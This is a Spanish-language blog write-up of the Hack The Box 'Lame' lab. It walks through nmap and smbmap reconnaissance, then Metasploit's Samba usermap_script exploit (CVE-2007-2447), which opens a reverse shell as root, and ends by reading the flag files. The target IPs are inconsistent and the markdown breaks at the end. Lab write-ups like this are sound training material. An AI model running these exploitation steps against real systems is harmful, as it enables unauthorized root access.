---
layout: post
title: "Lame" 
date: 2025-11-30 18:30:00 -0300
categories: [WRITEUPS,Lame]
tags: [HTB, Lame]
---
Writeup lame

# 💀 Lame: Informe Completo del Laboratorio

**Máquina:** Lame
**Autor Original:** ch4p
**Dificultad:** Fácil
**Clasificación:** Oficial
**IP Objetivo:** **10.129.16.24**

Lame fue una máquina histórica en Hack The Box, requiriendo un único exploit para obtener acceso de root debido a servicios desactualizados.

---

## 1. 🔍 Reconocimiento y Escaneo (Nmap)

El primer paso es enumerar puertos y servicios.

**Comando:**
```bash
nmap 10.129.16.24 -p- --open -T5 -v -n -oG allPorts
nmap -p21,22,139,445,3632 -sC -sV 10.129.16.24


Bash

PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 2.3.4
22/tcp   open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
3632/tcp open  distccd distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))

Análisis Inicial: Se identifican versiones antiguas de FTP (vsftpd 2.3.4) y Samba (Samba smbd 3.0.20). Ambos presentan vulnerabilidades críticas.

2. 💥 Ruta de Explotación (Samba)
Aunque vsftpd 2.3.4 es vulnerable al backdoor CVE-2011-2523, la explotación falló en este escenario. Nos centramos en Samba 3.0.20, el cual tiene una vulnerabilidad de Ejecución Remota de Comandos (RCE) conocida y confiable.

2.1. Enumeración de Samba
Enumeramos las comparticiones de Samba con smbmap, confirmando acceso de lectura/escritura (READ, WRITE) a la compartición tmp.

Comando:

Bash

smbmap -H 10.10.10.3
Salida Clave (smbmap):

Bash

Disk        Permissions Comment
----        ----------- ------
print$      NO ACCESS   Printer Drivers
tmp         READ, WRITE oh noes!
IPC$        NO ACCESS   IPC Service (lame server (Samba 3.0.20-Debian))
...
2.2. Explotación de usermap_script (CVE-2007-2447)
Buscamos exploits para la versión 3.0.20 y encontramos la vulnerabilidad 'Username' map script' Command Execution (CVE-2007-2447), la cual puede ser explotada vía Metasploit.

Comandos de Metasploit:

Bash

msfconsole
search Samba 3.0.20
use exploit/multi/samba/usermap_script
set RHOSTS 10.10.10.3
set LHOST 10.10.14.24  # Reemplazar con la IP de la máquina atacante (tun0)
run
Salida de Conexión Exitosa:

Bash

[*] Started reverse TCP handler on 10.10.14.24:4444 
[*] Command shell session 1 opened (10.10.14.24:4444 -> 10.10.10.3:58344) at 2024-07-22 07:47:46 -0500
2.3. Verificación de Root (Foothold)
Verificamos la identidad de la shell, la explotación resulta en acceso inmediato como root.

Comando:

Bash

id
Salida:

Bash

uid=0(root) gid=0(root)
3. 🚩 Obtención de Banderas
Dado que se obtuvo acceso de root directamente, la fase de Escalada de Privilegios se omite.

3.1. Bandera de Usuario (user.txt)
La bandera de usuario se encuentra en el directorio personal de makis.

Comando:

Bash

cat /home/makis/user.txt
3.2. Bandera de Root (root.txt)
La bandera de root se encuentra en el directorio /root/.

Comando:

Bash

cat /root/root.txt
✅ Conclusión
Lame es un claro ejemplo de los riesgos que implica ejecutar servicios críticos con versiones desactualizadas. La vulnerabilidad de Samba usermap_script permitió el acceso de root sin necesidad de una escalada posterior.



```markdown
**Salida Clave (Samba):**
```bash
PORT     STATE SERVICE VERSION
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP
